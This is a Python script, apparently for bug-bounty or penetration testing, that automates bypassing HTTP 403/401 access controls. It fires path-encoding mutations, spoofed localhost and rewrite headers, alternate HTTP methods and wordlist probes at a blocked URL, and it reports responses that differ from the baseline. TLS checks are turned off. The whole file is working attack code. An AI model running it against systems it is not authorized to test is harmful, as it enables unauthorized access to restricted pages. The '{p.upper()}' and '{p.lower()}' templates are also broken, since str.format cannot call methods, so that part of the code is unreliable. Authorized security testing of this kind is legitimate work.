#!/usr/bin/env python3
"""403/401 bypass engine: path, header, method and case mutations against a blocked URL.

    python3 bypass_403.py -u https://t/admin --tag r7 --rps 5
    python3 bypass_403.py -u https://t/admin -w paths.txt --headers

Only reports responses whose status differs from the baseline, or whose length moves >5%.
"""
import argparse, asyncio, sys
import aiohttp

PATH_MUT = [
    "{p}/", "{p}/.", "{p}//", "{p}/..;/", "{p};/", "{p}%20", "{p}%09", "{p}?",
    "{p}/%2e/", "{p}/..%2f", "{p}%2f", "{p}.json", "{p}.html", "{p}~", "{p}.bak",
    "/{p}", "//{p}", "/./{p}", "/%2e{p}", "{p}%00", "{p}%23", "{p}#", "{p}?x=1",
    "{p}/;", "{p}/%2e%2e{p}", "{p.upper()}", "{p.lower()}",
]
HDR_MUT = [
    ("X-Original-URL", "{p}"), ("X-Rewrite-URL", "{p}"), ("X-Forwarded-Prefix", "{p}"),
    ("X-Forwarded-For", "127.0.0.1"), ("X-Forwarded-Host", "localhost"),
    ("X-Real-IP", "127.0.0.1"), ("X-Originating-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"), ("X-Client-IP", "127.0.0.1"),
    ("X-Host", "localhost"), ("X-Forwarded-Server", "localhost"),
    ("Referer", "{base}/admin"), ("X-Original-Host", "localhost"),
]
METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH", "TRACE"]


async def req(sess, method, url, hdrs, tag, i):
    h = {"User-Agent": "Mozilla/5.0", "X-Hunt-Tag": f"{tag}-{i}"}
    h.update(hdrs)
    try:
        async with sess.request(method, url, headers=h, ssl=False,
                                allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=10)) as r:
            b = await r.read()
            return r.status, len(b)
    except Exception as e:
        return -1, str(e)[:40]


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--tag", default="hunt")
    ap.add_argument("--rps", type=float, default=5)
    ap.add_argument("-w", "--wordlist")
    ap.add_argument("--headers", action="store_true")
    a = ap.parse_args()
    base = a.url.rstrip("/")
    path = "/" + base.split("/", 3)[3] if base.count("/") >= 3 else "/"
    origin = "/".join(base.split("/")[:3])
    delay = 1.0 / a.rps
    conn = aiohttp.TCPConnector(limit=8, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as s:
        bstatus, blen = await req(s, "GET", a.url, {}, a.tag, 0)
        print(f"BASELINE\t{bstatus}\t{blen}\t{a.url}", file=sys.stderr)
        i = 1
        for m in PATH_MUT:
            cand = m.format(p=path)
            st, ln = await req(s, "GET", origin + cand, {}, a.tag, i); i += 1
            if st != bstatus or (isinstance(ln, int) and abs(ln - blen) > max(blen * 0.05, 40)):
                print(f"PATH\t{st}\t{ln}\t{cand}")
            await asyncio.sleep(delay)
        if a.headers:
            for k, v in HDR_MUT:
                st, ln = await req(s, "GET", a.url, {k: v.format(p=path, base=origin)}, a.tag, i); i += 1
                if st != bstatus or (isinstance(ln, int) and abs(ln - blen) > max(blen * 0.05, 40)):
                    print(f"HDR\t{st}\t{ln}\t{k}: {v}")
                await asyncio.sleep(delay)
        for m in METHODS:
            st, ln = await req(s, m, a.url, {}, a.tag, i); i += 1
            if st != bstatus:
                print(f"METHOD\t{st}\t{ln}\t{m}")
            await asyncio.sleep(delay)
        if a.wordlist:
            for w in open(a.wordlist):
                w = w.strip()
                if not w:
                    continue
                st, ln = await req(s, "GET", f"{origin}/{w}", {}, a.tag, i); i += 1
                if st in (200, 301, 302, 401, 403):
                    print(f"WORD\t{st}\t{ln}\t/{w}")
                await asyncio.sleep(delay)


if __name__ == "__main__":
    asyncio.run(main())
